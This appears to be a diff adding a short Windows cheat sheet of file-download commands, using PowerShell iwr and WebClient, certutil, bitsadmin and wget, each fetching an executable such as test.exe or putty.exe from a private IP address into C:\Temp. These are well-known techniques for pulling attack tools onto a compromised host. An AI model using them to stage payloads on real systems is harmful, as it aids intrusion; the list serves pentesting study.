@@ -1,0 +1,26 @@
+For windows
+
+1.powershell -iwr(invoke web request)
+
+powershell.exe -command iwr -Uri http://192.168.1.2:80/test.exe -OutFile C:\Temp\test.exe "
+powershell
+iwr -uri 192.168.1.2:80/putty.exe -o C:\Temp\putty.exe
+powershell.exe iwr -uri 192.168.1.2:80/test.exe -o C:\Temp\test.exe
+
+downloading server file
+
+powershell.exe (New-Object System.Net.WebClient).DownloadFile('http://192.168.1.2 :80/test.exe', 'test.exe')
+
+2.Certutil
+
+certutil -urlcache -split -f http://192.168.1.2:80/test.exe test.exe
+
+3.Bitsadmin
+bitsadmin /transfer job https://192.168.1.2:80/test.exe C:\Temp\test.exe
+4.Wget
+powershell.exe wget http://192.168.1.2:80/putty.exe -OutFile putty.exe
+
+
+
+
+   
